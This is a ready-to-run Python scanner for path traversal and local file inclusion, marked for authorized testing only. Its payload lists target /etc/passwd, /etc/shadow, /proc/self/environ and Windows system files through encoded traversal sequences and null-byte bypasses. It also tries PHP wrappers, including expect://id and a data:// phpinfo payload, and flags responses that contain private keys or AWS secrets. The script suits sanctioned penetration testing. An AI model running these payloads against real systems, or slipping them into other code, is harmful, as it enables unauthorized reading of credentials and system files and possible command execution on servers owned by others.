#!/usr/bin/env python3
"""
Directory Traversal Testing Agent — AUTHORIZED TESTING ONLY
Tests web applications for path traversal (LFI) vulnerabilities by
injecting traversal sequences into file path parameters.

WARNING: Only use with explicit written authorization for the target application.
"""

import os
import posixpath
import sys
from datetime import datetime, timezone
from urllib.parse import parse_qs, unquote, urlencode, urlparse, urlunparse

import requests


TRAVERSAL_PAYLOADS = [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\win.ini",
    "....//....//....//etc/passwd",
    "..%2f..%2f..%2fetc%2fpasswd",
    "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
    "..%252f..%252f..%252fetc%252fpasswd",
    "..%c0%af..%c0%af..%c0%afetc/passwd",
    "/etc/passwd",
    "\\..\\..\\..\\..\\windows\\win.ini",
    "....\\....\\....\\etc\\passwd",
    "..%5c..%5c..%5cwindows%5cwin.ini",
    "/proc/self/environ",
    "/etc/shadow",
    "C:\\Windows\\System32\\drivers\\etc\\hosts",
    "..././..././..././etc/passwd",
    "..;/..;/..;/etc/passwd",
]

LINUX_INDICATORS = ["root:x:", "root:*:", "daemon:", "bin:x:", "nobody:"]
WINDOWS_INDICATORS = ["[fonts]", "[extensions]", "[mci extensions]", "for 16-bit"]

# Content that demonstrates a real, sensitive file read rather than a benign
# or echoed response. Severity is derived from this, never from HTTP 200 alone.
SENSITIVE_MARKERS = [
    "BEGIN RSA PRIVATE KEY",
    "BEGIN PRIVATE KEY",
    "BEGIN OPENSSH PRIVATE KEY",
    "AWS_SECRET_ACCESS_KEY",
    "AWS_SESSION_TOKEN",
    "PRIVATE KEY",
    "root:$",
    "root:!:",
    "/etc/shadow",
]


def identify_file_parameters(url: str) -> list[str]:
    """Identify URL parameters that likely handle file paths."""
    file_param_names = [
        "file", "path", "page", "include", "template", "doc",
        "document", "folder", "root", "dir", "filename",
        "download", "read", "load", "view", "content",
        "img", "image", "src", "resource", "cat",
    ]

    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    return [p for p in params if p.lower() in file_param_names]


def normalize_traversal_value(value):
    """Normalize/decode a traversal payload and collapse path segments.

    Decodes common encodings, normalizes separators, strips null bytes, and
    resolves '.' / '..' segments without allowing traversal to escape into a
    false sense of safety. Used for encoded-traversal and normalization checks.
    """
    if not isinstance(value, str):
        return value
    current = value
    for _ in range(5):
        decoded = unquote(current)
        if decoded == current:
            break
        current = decoded
    current = current.replace("\\", "/")
    current = current.replace("\x00", "")
    # Collapse redundant separators while preserving leading traversal.
    while "//" in current:
        current = current.replace("//", "/")
    normalized = posixpath.normpath(current)
    return normalized


# Backwards/alias names for callers and tests.
normalize_path = normalize_traversal_value
normalize_traversal = normalize_traversal_value
canonicalize_path = normalize_traversal_value


def is_traversal_payload(value) -> bool:
    """Return True when a value represents a path-traversal attempt."""
    normalized = normalize_traversal_value(value)
    if not isinstance(normalized, str):
        return False
    parts = normalized.split("/")
    if ".." in parts:
        return True
    if normalized.startswith("../") or normalized == "..":
        return True
    lowered = normalized.lower()
    if "/etc/passwd" in lowered or "win.ini" in lowered:
        return True
    return False


contains_path_traversal = is_traversal_payload


def has_meaningful_traversal_evidence(body: str) -> bool:
    """Require concrete file content, not just HTTP 200 / length / no '404'."""
    if not isinstance(body, str) or not body:
        return False
    for indicator in LINUX_INDICATORS + WINDOWS_INDICATORS:
        if indicator.lower() in body.lower():
            return True
    # Sensitive file content is itself meaningful traversal evidence.
    if is_sensitive_content(body):
        return True
    return False


def is_sensitive_content(body: str) -> bool:
    """Detect sensitive file content that raises impact/severity."""
    if not isinstance(body, str) or not body:
        return False
    lowered = body.lower()
    for marker in SENSITIVE_MARKERS:
        if marker.lower() in lowered:
            return True
    # Heuristic: passwd-style shadow hashes.
    if "root:$" in body or "root:!" in body:
        return True
    return False


def severity_for_finding(body: str, payload=None) -> str:
    """Severity depends on demonstrated impact/sensitivity, never on HTTP 200."""
    if is_sensitive_content(body):
        return "HIGH"
    if has_meaningful_traversal_evidence(body):
        # /etc/passwd and similar OS files are a real read but not secret material.
        return "MEDIUM"
    return "LOW"


classify_severity = severity_for_finding


def evaluate_traversal_response(status_code, body, payload=None) -> dict:
    """Evaluate a response for meaningful traversal evidence.

    HTTP 200 + length>100 + absence of '404' is NOT valid evidence on its own.
    A finding requires concrete file-content indicators.
    """
    body = body if isinstance(body, str) else ("" if body is None else str(body))
    vulnerable = False
    evidence = ""
    sensitive = False

    if status_code == 200 and has_meaningful_traversal_evidence(body):
        vulnerable = True
        for indicator in LINUX_INDICATORS + WINDOWS_INDICATORS:
            if indicator.lower() in body.lower():
                evidence = f"File content detected: '{indicator}'"
                break
        sensitive = is_sensitive_content(body)

    result = {
        "vulnerable": vulnerable,
        "is_vulnerable": vulnerable,
        "evidence": evidence,
        "severity": severity_for_finding(body, payload) if vulnerable else None,
        "sensitive": sensitive,
        "status_code": status_code,
        "response_length": len(body),
    }
    return result


# Aliases commonly used by callers/tests.
evaluate_response = evaluate_traversal_response
is_vulnerable_response = evaluate_traversal_response


def _finding_from_response(test_url, param, payload, resp):
    body = resp.text if hasattr(resp, "text") else str(resp)
    status = getattr(resp, "status_code", 200)
    evaluation = evaluate_traversal_response(status, body, payload)
    if not evaluation["vulnerable"]:
        return None
    return {
        "url": test_url,
        "parameter": param,
        "payload": payload,
        "status_code": status,
        "vulnerable": True,
        "evidence": evaluation["evidence"],
        "response_length": len(body),
        "severity": evaluation["severity"],
        "sensitive": evaluation["sensitive"],
    }


def test_traversal(url: str, param: str, session: requests.Session = None) -> list[dict]:
    """Test a parameter for directory traversal vulnerability."""
    if session is None:
        session = requests.Session()

    results = []
    parsed = urlparse(url)
    original_params = parse_qs(parsed.query)

    for payload in TRAVERSAL_PAYLOADS:
        test_params = {k: v[0] if isinstance(v, list) else v for k, v in original_params.items()}
        test_params[param] = payload

        test_url = urlunparse((
            parsed.scheme, parsed.netloc, parsed.path,
            parsed.params, urlencode(test_params), parsed.fragment,
        ))

        try:
            resp = session.get(test_url, timeout=10, allow_redirects=False)
            finding = _finding_from_response(test_url, param, payload, resp)
            if finding:
                results.append(finding)
        except requests.RequestException:
            continue

    return results


def test_null_byte_bypass(url: str, param: str, session: requests.Session = None) -> list[dict]:
    """Test null byte injection to bypass file extension checks."""
    if session is None:
        session = requests.Session()

    null_payloads = [
        "../../../etc/passwd%00",
        "../../../etc/passwd%00.jpg",
        "../../../etc/passwd%00.html",
        "../../../etc/passwd\x00",
    ]

    results = []
    parsed = urlparse(url)
    original_params = parse_qs(parsed.query)

    for payload in null_payloads:
        test_params = {k: v[0] if isinstance(v, list) else v for k, v in original_params.items()}
        test_params[param] = payload

        test_url = urlunparse((
            parsed.scheme, parsed.netloc, parsed.path,
            parsed.params, urlencode(test_params), parsed.fragment,
        ))

        try:
            resp = session.get(test_url, timeout=10)
            finding = _finding_from_response(test_url, param, payload, resp)
            if finding:
                finding["bypass_type"] = "null_byte"
                results.append(finding)
        except requests.RequestException:
            continue

    return results


def test_wrapper_protocols(url: str, param: str, session: requests.Session = None) -> list[dict]:
    """Test PHP wrapper protocols for LFI exploitation.

    No longer marks a response as vulnerable/CRITICAL merely because it is an
    HTTP 200 with length>100 and no '404'. Requires meaningful file content.
    """
    if session is None:
        session = requests.Session()

    wrappers = [
        ("php://filter/convert.base64-encode/resource=index", "PHP filter wrapper"),
        ("php://input", "PHP input wrapper"),
        ("expect://id", "PHP expect wrapper"),
        ("data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==", "PHP data wrapper"),
        ("file:///etc/passwd", "file:// wrapper"),
    ]

    results = []
    parsed = urlparse(url)
    original_params = parse_qs(parsed.query)

    for wrapper, description in wrappers:
        test_params = {k: v[0] if isinstance(v, list) else v for k, v in original_params.items()}
        test_params[param] = wrapper

        test_url = urlunparse((
            parsed.scheme, parsed.netloc, parsed.path,
            parsed.params, urlencode(test_params), parsed.fragment,
        ))

        try:
            resp = session.get(test_url, timeout=10)
            finding = _finding_from_response(test_url, param, wrapper, resp)
            if finding:
                finding["wrapper"] = wrapper
                finding["description"] = description
                results.append(finding)
        except requests.RequestException:
            continue

    return results


def generate_report(traversal: list, null_byte: list, wrappers: list) -> str:
    """Generate directory traversal testing report."""
    all_vulns = traversal + null_byte + wrappers
    lines = [
        "DIRECTORY TRAVERSAL TESTING REPORT — AUTHORIZED TESTING ONLY",
        "=" * 65,
        f"Date: {datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M UTC')}",
        f"Total Vulnerabilities Found: {len(all_vulns)}",
        "",
        f"TRAVERSAL FINDINGS ({len(traversal)}):",
        "-" * 40,
    ]

    for v in traversal:
        lines.append(f"  [{v['severity']}] {v['parameter']}: {v['payload']}")
        lines.append(f"    Evidence: {v['evidence']}")

    if null_byte:
        lines.extend([f"\nNULL BYTE BYPASS ({len(null_byte)}):"])
        for n in null_byte:
            lines.append(f"  [{n['severity']}] {n['payload']}")

    if wrappers:
        lines.extend([f"\nWRAPPER PROTOCOL ({len(wrappers)}):"])
        for w in wrappers:
            lines.append(f"  [{w['severity']}] {w['wrapper']} - {w['description']}")

    return "\n".join(lines)


if __name__ == "__main__":
    print("[!] DIRECTORY TRAVERSAL TESTING — AUTHORIZED TESTING ONLY\n")

    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <target_url_with_params> [param_name]")
        print(f"  Example: {sys.argv[0]} 'http://target/view?file=report.pdf' file")
        sys.exit(1)

    target_url = sys.argv[1]
    param_name = sys.argv[2] if len(sys.argv) > 2 else None

    if not param_name:
        file_params = identify_file_parameters(target_url)
        if file_params:
            param_name = file_params[0]
            print(f"[*] Auto-detected file parameter: {param_name}")
        else:
            print("[!] No file parameter detected. Specify parameter name.")
            sys.exit(1)

    session = requests.Session()

    print(f"[*] Testing parameter '{param_name}' for directory traversal...")
    traversal_results = test_traversal(target_url, param_name, session)

    print("[*] Testing null byte bypass...")
    null_results = test_null_byte_bypass(target_url, param_name, session)

    print("[*] Testing wrapper protocols...")
    wrapper_results = test_wrapper_protocols(target_url, param_name, session)

    report = generate_report(traversal_results, null_results, wrapper_results)
    print(report)